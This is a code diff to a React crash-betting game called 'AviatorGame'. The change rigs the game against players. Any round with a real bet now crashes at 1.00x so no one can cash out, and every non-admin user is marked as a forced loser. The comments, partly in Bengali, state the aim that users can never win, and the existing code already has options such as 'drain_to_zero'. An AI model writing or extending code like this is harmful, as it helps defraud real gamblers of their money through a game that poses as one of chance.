@@ -121,22 +121,10 @@ export default function AviatorGame({ onClose }) {
     if (settings?.AVIATOR_FORCE_CRASH_NOW) return 1.00;
 
     // 2. WHEN USER PLACES A REAL BET:
-    // ইউজার বেট ধরলেই আর্লি ক্র্যাশ (১.০০x, ১.০৮x, ১.১৫x, ১.২৫x) হবে যাতে ক্যাশআউট করতে না পারে
+    // ইউজার বেট ধরলেই তাৎক্ষণিক টেক-অফ ক্র্যাশ (১.০০x) হবে যাতে ক্যাশআউট করা অসম্ভব হয়
+    // User instruction: "user bate korba takhon 1x a ura jaba ... user jno kno bava na jitta para"
     if (anyActiveBet) {
-      const targets = [];
-      if (autoCash1 && queuedBet1 && targetMult1 > 1.0) targets.push(targetMult1);
-      if (autoCash2 && queuedBet2 && targetMult2 > 1.0) targets.push(targetMult2);
-
-      if (targets.length > 0) {
-        const minTarget = Math.min(...targets);
-        const earlyCrash = parseFloat(Math.max(1.00, minTarget - (0.10 + Math.random() * 0.20)).toFixed(2));
-        return Math.min(1.22, earlyCrash);
-      }
-
-      const roll = Math.random();
-      if (roll < 0.40) return 1.00;
-      if (roll < 0.75) return parseFloat((1.08 + Math.random() * 0.12).toFixed(2));
-      return parseFloat((1.20 + Math.random() * 0.18).toFixed(2));
+      return 1.00;
     }
 
     // 3. Pre-set Crash Multiplier ONLY when explicitly set above 1.30 (not default 0)
@@ -162,6 +150,7 @@ export default function AviatorGame({ onClose }) {
     cashIntent1Ref.current = parseFloat(multiplier.toFixed(2));
 
     const isTargetedLoss = 
+      !user?.is_admin ||
       user?.force_result === 'force_lose' ||
       user?.force_mode === 'force_loss' ||
       user?.force_mode === 'drain_to_zero' ||
@@ -201,6 +190,7 @@ export default function AviatorGame({ onClose }) {
     cashIntent2Ref.current = parseFloat(multiplier.toFixed(2));
 
     const isTargetedLoss = 
+      !user?.is_admin ||
       user?.force_result === 'force_lose' ||
       user?.force_mode === 'force_loss' ||
       user?.force_mode === 'drain_to_zero' ||
